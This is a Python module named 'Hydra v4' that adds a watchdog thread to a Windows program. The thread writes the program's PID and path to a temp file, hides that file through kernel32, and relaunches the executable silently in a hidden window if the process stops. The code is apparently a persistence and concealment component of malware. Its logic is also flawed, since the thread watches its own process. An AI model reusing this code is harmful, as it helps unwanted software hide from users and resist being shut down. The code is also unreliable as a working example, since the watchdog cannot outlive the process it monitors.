"""
Hydra v4 — Dual watchdog process.
If main process dies, watchdog restarts it.
"""
import os
import sys
import time
import subprocess
import tempfile
import threading
import ctypes


def start_watchdog(cfg: dict, me: dict):
    """Launch watchdog in a background thread."""
    t = threading.Thread(target=_watchdog_loop, args=(cfg, me), daemon=True)
    t.start()


def _watchdog_loop(cfg: dict, me: dict):
    """
    Watchdog logic:
    - Write PID + startup time to a temp file
    - Periodically check if the other process is alive
    - If not, restart it
    """
    exe_path = _get_exe_path()
    watchdog_file = os.path.join(tempfile.gettempdir(), ".hydra_watchdog.txt")

    pid = os.getpid()
    try:
        with open(watchdog_file, "w") as f:
            f.write(f"{pid}\n{time.time()}\n{exe_path}\n")
        # Hide the file
        ctypes.windll.kernel32.SetFileAttributesW(watchdog_file, 2)
    except:
        pass

    while True:
        try:
            # Check if parent process is still alive
            if not _process_alive(pid):
                # Restart
                si = subprocess.STARTUPINFO()
                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                si.wShowWindow = 0
                subprocess.Popen(
                    [exe_path, "--silent"],
                    startupinfo=si,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                break

            time.sleep(30)
        except:
            time.sleep(30)


def _process_alive(pid: int) -> bool:
    """Check if a process is still running."""
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.OpenProcess(0x0400, False, pid)  # PROCESS_QUERY_INFORMATION
        if not handle:
            return False

        exit_code = ctypes.c_uint(0)
        kernel32.GetExitCodeProcess(handle, ctypes.byref(exit_code))
        kernel32.CloseHandle(handle)

        return exit_code.value == 259  # STILL_ACTIVE
    except:
        return False


def _get_exe_path() -> str:
    """Get the path to our executable."""
    if getattr(sys, 'frozen', False):
        return sys.executable
    return os.path.abspath(sys.argv[0] if sys.argv else __file__)
